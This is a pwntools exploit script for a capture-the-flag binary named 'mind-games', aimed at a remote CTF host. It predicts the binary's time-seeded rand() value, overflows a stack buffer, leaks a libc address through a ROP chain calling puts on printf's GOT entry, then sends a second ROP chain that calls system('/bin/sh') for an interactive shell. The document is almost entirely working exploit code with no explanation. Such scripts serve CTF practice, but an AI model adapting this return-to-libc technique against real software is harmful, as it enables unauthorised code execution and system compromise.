from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './mind-games'
HOST = 'pwn.chal.ctf.gdgalgiers.com'
PORT = 1404

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

import ctypes
LIBC = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
t = LIBC.time(0)
LIBC.srand(t)
num = LIBC.rand()
if args.D:
	debug(r, [])
rdi = 0x004014c3
bss = 0x404270

payload = ''
payload += str(num)
payload = payload.ljust(0x10, b'\x00')
payload += 'a'*32
payload += p64(bss)
payload += flat(rdi, elf.got.printf, elf.plt.puts, elf.sym.main)

r.sendlineafter('? ', payload)
r.recvuntil('\n')
r.recvuntil('\n')
leak = u64(r.recvuntil('\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak -0x64e10
system = base+ 0x55410
binsh = base + 0x1b75aa

t = LIBC.time(0)
LIBC.srand(t)
num = LIBC.rand()

payload = ''
payload += str(num)
payload = payload.ljust(0x10, b'\x00')
payload += 'a'*32
payload += p64(bss)
payload += flat(rdi+1, rdi, binsh, system)
r.sendlineafter('? ', payload)

r.interactive()
r.close()
